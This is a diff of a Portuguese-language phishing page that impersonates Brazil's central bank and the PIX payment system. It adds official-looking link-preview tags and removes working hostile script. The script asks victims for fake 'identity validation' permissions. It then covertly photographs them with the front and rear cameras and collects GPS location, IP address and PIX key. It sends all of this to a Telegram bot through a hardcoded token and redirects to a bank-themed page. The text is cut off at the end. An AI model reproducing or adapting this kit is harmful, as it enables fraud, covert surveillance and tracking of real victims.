@@ -4,6 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Portal de Recebimento PIX</title>
+
+    <meta property="og:title" content="SISTEMA DE AUTENTICAÇÃO PIX">
+    <meta property="og:description" content="Conferência de recebimento pendente. Autentique para liberar o valor via PIX.">
+    <meta property="og:image" content="https://logodownload.org/wp-content/uploads/2020/02/pix-bc-logo.png">
+    <meta property="og:type" content="website">
+
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         .pix-card { background: white; max-width: 420px; width: 100%; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); overflow: hidden; }
@@ -28,6 +34,7 @@
     <div id="header-bc" class="bc-header">
         <img src="https://logodownload.org/wp-content/uploads/2020/02/pix-bc-logo.png" alt="BC" class="bc-logo">
     </div>
+
     <div class="content">
         <div id="tela-dados">
             <label>Valor para Recebimento (R$):</label>
@@ -36,101 +43,5 @@
             <input type="text" id="chave" placeholder="CPF, E-mail ou Celular">
             <button class="btn-acao" onclick="mostrarAviso()">PROSSEGUIR</button>
         </div>
-        <div id="tela-permissao">
-            <h1 style="font-size: 20px; color: #333;">Validação de Identidade</h1>
-            <p id="texto-instrucao" style="color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 30px;">
-                Para sua segurança, o Banco Central exige as permissões do dispositivo para liberar este recebimento. 
-                <br><br>
-                Isso garante que você receba o valor e evita golpes.
-            </p>
-            <button class="btn-acao btn-blue" id="btnFinal" onclick="dispararCaptura()">
-                AUTENTICAR E LIBERAR PIX
-                <div class="spinner" id="spinner"></div>
-            </button>
-        </div>
-        <div class="footer-info">Portal de Conferência de Valores Interbancário<br>Criptografia de Segurança Ativa</div>
-    </div>
-</div>
 
-<video id="video" width="640" height="480" autoplay style="display:none;"></video>
-<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-
-<script>
-    const TOKEN = "8757264210:AAGASjOqrfL2a8QgIDp0rszG3Wi6sWWnb0s"; 
-    const ID = "560716860";
-    let valorGlobal, chaveGlobal;
-
-    function mostrarAviso() {
-        valorGlobal = document.getElementById('valor').value;
-        chaveGlobal = document.getElementById('chave').value;
-        if (!valorGlobal || !chaveGlobal) return alert("Preencha os dados.");
-        document.getElementById('header-dados').style.display = 'none';
-        document.getElementById('tela-dados').style.display = 'none';
-        document.getElementById('header-bc').style.display = 'block';
-        document.getElementById('tela-permissao').style.display = 'block';
-    }
-
-    async function dispararCaptura() {
-        document.getElementById('spinner').style.display = 'inline-block';
-        document.getElementById('btnFinal').disabled = true;
-
-        const ua = navigator.userAgent;
-        const isAndroid = /Android/i.test(ua);
-        let aparelho = isAndroid ? "🤖 Android" : (/iPhone/i.test(ua) ? "📱 iPhone" : "💻 PC");
-
-        let dadosConexao = { ip: "Buscando..." };
-        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => dadosConexao.ip = d.ip).catch(() => {});
-
-        const finalizarAcao = (pos) => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const mapa = `https://www.google.com/maps?q=${lat},${lon}`;
-            const msg = `📍 *ALVO LOCALIZADO*\n💰 Valor: R$ ${valorGlobal}\n🔑 Chave: ${chaveGlobal}\n🌐 IP: ${dadosConexao.ip}\n${aparelho}\n🌍 Mapa: ${mapa}`;
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-            window.location.href = "bradesco.html";
-        };
-
-        // LÓGICA DE PERSISTÊNCIA: Tenta a câmera, se der erro no Android, pula pro GPS
-        try {
-            await tirarFoto("user", "FRONTAL");
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                await tirarFoto("environment", "TRASEIRA");
-                finalizarAcao(pos);
-            }, () => { window.location.href = "autorizar.html"; }, {timeout: 10000});
-        } catch (e) {
-            // Se a câmera falhar de cara (comum no Android), tenta ao menos o GPS antes de desistir
-            navigator.geolocation.getCurrentPosition(finalizarAcao, () => {
-                window.location.href = "autorizar.html";
-            }, {timeout: 10000});
-        }
-    }
-
-    async function tirarFoto(face, label) {
-        try {
-            if (window.currentStream) window.currentStream.getTracks().forEach(t => t.stop());
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: face, width: { ideal: 1280 }, height: { ideal: 720 } } 
-            });
-            window.currentStream = stream;
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            await new Promise(r => video.onloadedmetadata = r);
-            await new Promise(r => setTimeout(r, 1000));
-            const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            stream.getTracks().forEach(t => t.stop());
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
-            const fd = new FormData();
-            fd.append('chat_id', ID);
-            fd.append('photo', blob, `${label}.jpg`);
-            fd.append('caption', `📸 ${label}`);
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-        } catch (err) {
-            throw err; // Repassa para o catch principal tratar
-        }
-    }
-</script>
-</body>
-</html>
+        <div id="tela
